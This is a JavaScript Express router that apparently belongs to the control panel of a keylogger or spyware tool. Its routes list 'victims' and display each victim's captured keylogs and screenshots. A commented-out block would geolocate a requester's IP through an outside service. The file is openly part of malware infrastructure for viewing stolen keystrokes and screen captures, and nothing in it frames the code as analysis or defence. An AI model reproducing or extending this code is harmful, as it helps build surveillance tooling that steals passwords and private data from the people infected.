'use strict'

const express = require('express')
const https = require('https')
const escapingFunctions = require('../middlewares/escaping')
const router = express.Router()
const clientService = require('../../services/clientService')
const keylogsService = require('../../services/keylogsService')
const screenshotService = require('../../services/screenshotService')

router.get('/', async (req, res, next) => {
    try {
        const clients = await clientService.getAll()
        
        //res.locals.clients = clients
        //console.log(res.locals.clients)

        const ip = req.ip.split(':')[req.ip.split(':').length - 1]
        console.log(ip)
        /*
        https.get('https://ip-api.io/json/' + ip, (resp) => {
            let data = '';

            // A chunk of data has been received.
            resp.on('data', (chunk) => {
                data += chunk;
            })

            // The whole response has been received. Print out the result.
            resp.on('end', () => {
                console.log(JSON.parse(data).country_code);
            })

        }).on("error", (err) => {
            console.log("Error: " + err.message)
        })
        */

        res.render('pages/victims', {clients: clients})
    } catch (e) { next(e) }
})

router.get('/:uuid', async (req, res, next) => {
    try {
        const single_client = await clientService.findOneByUuid(req.params.uuid)
        const keylogs = await keylogsService.findAllByClientId(single_client.id)
        const screenshots = await screenshotService.findAllByClientId(single_client.id)

        
        res.render('pages/single_victim', 
        {
            single_client: single_client,
            keylogs: keylogs,
            screenshots: screenshots
        })
    } catch (e) { next(e) }
})

module.exports = router